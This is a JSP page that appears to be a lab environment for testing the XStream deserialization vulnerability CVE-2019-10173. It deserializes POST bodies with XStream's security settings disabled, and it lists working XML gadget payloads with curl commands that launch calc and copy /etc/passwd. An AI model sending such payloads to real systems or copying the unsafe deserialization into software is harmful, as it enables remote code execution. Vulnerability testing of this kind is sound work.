<%@ page import="java.io.*" %>
<%@ page import="com.thoughtworks.xstream.XStream" %>
<%@page contentType="text/html" pageEncoding="UTF-8"%>
<%
if ("POST".equals(request.getMethod()))
{   
    int bytesRead         = 0;
    char[] buffer         = new char[4096];
    BufferedReader reader = request.getReader();
    StringBuilder data    = new StringBuilder();

    while((bytesRead = reader.read(buffer)) != -1) 
    {
        data.append(buffer, 0, bytesRead);
    }

    XStream xStream = new XStream();
     //XStream.setupDefaultSecurity(xStream);//1.4.10后可用，启用默认安全配置，此处先不使用
    xStream.fromXML(data.toString());
}

%>

<html>
    <title>CVE-2019-10173 xstream 漏洞测试</title>
    <body>
        <p>快速测试 - 执行 calc</p>
        <pre style="background: #eee; margin: 10px; padding: 10px; ">cat > /tmp/1.txt << EOF
&lt;sorted-set>
    &lt;dynamic-proxy>
        &lt;interface>java.lang.Comparable&lt;/interface>
        &lt;handler class="java.beans.EventHandler">
            &lt;target class="java.lang.ProcessBuilder">
                &lt;command>
                    &lt;string>calc&lt;/string>
                &lt;/command>
            &lt;/target>
            &lt;action>start&lt;/action>
        &lt;/handler>
    &lt;/dynamic-proxy>
&lt;/sorted-set>
EOF

curl <%= request.getRequestURL() %> --data-binary @/tmp/1.txt
</pre>

        <p>快速测试 - 执行 cp /etc/passwd /tmp</p>
       <pre style="background: #eee; margin: 10px; padding: 10px; ">cat > /tmp/1.txt << EOF
&lt;sorted-set>
    &lt;dynamic-proxy>
        &lt;interface>java.lang.Comparable&lt;/interface>
        &lt;handler class="java.beans.EventHandler">
            &lt;target class="java.lang.ProcessBuilder">
                &lt;command>
                    &lt;string>cp&lt;/string>
                    &lt;string>/etc/passwd&lt;/string>
                    &lt;string>/tmp&lt;/string>
                &lt;/command>
            &lt;/target>
            &lt;action>start&lt;/action>
        &lt;/handler>
    &lt;/dynamic-proxy>
&lt;/sorted-set>
EOF

curl <%= request.getRequestURL() %> --data-binary @/tmp/1.txt
</pre>

    </body>
</html>